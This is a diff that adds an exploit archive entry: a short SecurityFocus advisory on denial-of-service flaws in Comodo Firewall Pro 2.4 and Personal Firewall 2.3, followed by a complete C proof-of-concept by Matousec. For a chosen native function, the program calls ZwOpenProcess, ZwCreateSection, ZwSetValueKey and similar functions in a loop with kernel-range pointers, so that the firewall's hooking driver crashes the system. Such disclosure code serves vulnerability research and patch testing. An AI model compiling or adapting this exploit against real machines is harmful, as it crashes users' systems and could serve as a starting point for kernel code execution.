@@ -1,0 +1,160 @@
+source: http://www.securityfocus.com/bid/22357/info
+
+Comodo Firewall is prone to multiple denial-of-service vulnerabilities because it fails to adequately validate user supplied data.
+
+Exploiting these issues may permit attackers to cause system crashes and deny service to legitimate users. Presumaby, attackers may also be able to execute arbitrary code, but this has not been confirmed.
+
+Comodo Firewall Pro 2.4.16.174 and Comodo Personal Firewall 2.3.6.81 are vulnerable; other versions may also be affected.
+
+/*
+
+ Testing program for Multiple insufficient argument validation of hooked 
+SSDT function (BTP00000P005CF)
+ 
+
+ Usage:
+ prog FUNCNAME
+   FUNCNAME - name of function to be checked
+
+ Description:
+ This program calls given function with parameters that crash the 
+system. This happens because of 
+ insufficient validation of function arguments in the driver of the 
+firewall.
+
+ Test:
+ Running the testing program with the name of a function from the list 
+of affected functions.
+
+*/
+
+#undef __STRICT_ANSI__
+#include <stdio.h>
+#include <string.h>
+#include <windows.h>
+#include <ddk/ntapi.h>
+#include <ddk/ntifs.h>
+
+void about(void)
+{
+  printf("Testing program for Multiple insufficient argument validation 
+of hooked SSDT function (BTP00000P005CF)\n");
+  printf("Windows Personal Firewall analysis project\n");
+  printf("Copyright 2007 by Matousec - Transparent security\n");
+  printf("http://www.matousec.com/""\n\n");
+  return;
+}
+
+void usage(void)
+{
+  printf("Usage: test FUNCNAME\n"
+         "  FUNCNAME - name of function to be checked\n");
+  return;
+}
+
+void print_last_error(void)
+{
+  LPTSTR buf;
+  DWORD code=GetLastError();
+  if (FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | 
+FORMAT_MESSAGE_FROM_SYSTEM,NULL,code,0,(LPTSTR)&buf,0,NULL))
+  {
+    fprintf(stderr,"Error code: %ld\n",code);
+    fprintf(stderr,"Error message: %s",buf);
+    LocalFree(buf);
+  } else fprintf(stderr,"Unable to format error message for code 
+%ld.\n",code);
+  return;
+}
+
+
+int main(int argc,char **argv)
+{
+  about();
+
+  if (argc!=2)
+  {
+    usage();
+    return 1;
+  }
+
+  if (!stricmp(argv[1],"NtConnectPort") || 
+!stricmp(argv[1],"ZwConnectPort"))
+  {
+    HANDLE handle;
+    UNICODE_STRING us={0x1000,0x1000,NULL};
+    SECURITY_QUALITY_OF_SERVICE sqos;
+    for (int i=0;i>=0;i++)
+    {
+      us.Buffer=(PVOID)(i+0x80000000);
+      ZwConnectPort(&handle,&us,&sqos,NULL,NULL,NULL,NULL,NULL);
+    }
+  } else if (!stricmp(argv[1],"NtCreatePort") || 
+!stricmp(argv[1],"ZwCreatePort"))
+  {
+    HANDLE handle;
+    OBJECT_ATTRIBUTES oa;
+    UNICODE_STRING us={0x1000,0x1000,NULL};
+    InitializeObjectAttributes(&oa,&us,0,NULL,NULL);
+    for (int i=0;i>=0;i++)
+    {
+      us.Buffer=(PVOID)(i+0x80000000);
+      ZwCreatePort(&handle,&oa,0,0,0);
+    }
+  } else if (!stricmp(argv[1],"NtCreateSection") || 
+!stricmp(argv[1],"ZwCreateSection"))
+  {
+    HANDLE handle;
+    for (int i=0;i>=0;i++)
+    {
+      POBJECT_ATTRIBUTES oa=(PVOID)(i+0x80000000);
+      ZwCreateSection(&handle,0,oa,NULL,0,0,NULL);
+    }
+  } else if (!stricmp(argv[1],"NtOpenProcess") || 
+!stricmp(argv[1],"ZwOpenProcess"))
+  {
+    HANDLE handle;
+    OBJECT_ATTRIBUTES oa;
+    UNICODE_STRING us={0x1000,0x1000,NULL};
+    InitializeObjectAttributes(&oa,&us,0,NULL,NULL);
+    for (int i=0;i>=0;i++)
+    {
+      PCLIENT_ID clid=(PVOID)(i+0x80000000);
+      ZwOpenProcess(&handle,PROCESS_ALL_ACCESS,&oa,clid);
+    }
+  } else if (!stricmp(argv[1],"NtOpenSection") || 
+!stricmp(argv[1],"ZwOpenSection"))
+  {
+    HANDLE handle;
+    for (int i=0;i>=0;i++)
+    {
+      POBJECT_ATTRIBUTES oa=(PVOID)(i+0x80000000);
+      ZwOpenSection(&handle,SECTION_ALL_ACCESS,oa);
+    }
+  } else if (!stricmp(argv[1],"NtOpenThread") || 
+!stricmp(argv[1],"ZwOpenThread"))
+  {
+    HANDLE handle;
+    OBJECT_ATTRIBUTES oa;
+    UNICODE_STRING us={0x1000,0x1000,NULL};
+    InitializeObjectAttributes(&oa,&us,0,NULL,NULL);
+    for (int i=0;i>=0;i++)
+    {
+      PCLIENT_ID clid=(PVOID)(i+0x80000000);
+      ZwOpenThread(&handle,THREAD_ALL_ACCESS,&oa,clid);
+    }
+  } else if (!stricmp(argv[1],"NtSetValueKey") || 
+!stricmp(argv[1],"ZwSetValueKey"))
+  {
+    for (int i=0;i>=0;i++)
+    {
+      PUNICODE_STRING us=(PVOID)(i+0x80000000);
+      ZwSetValueKey(NULL,us,0,REG_NONE,NULL,0);
+    }
+  } else printf("\nI do not know how to exploit the vulnerability using 
+this function.\n");
+
+  printf("\nTEST FAILED!\n");
+  return 1;
+}
+
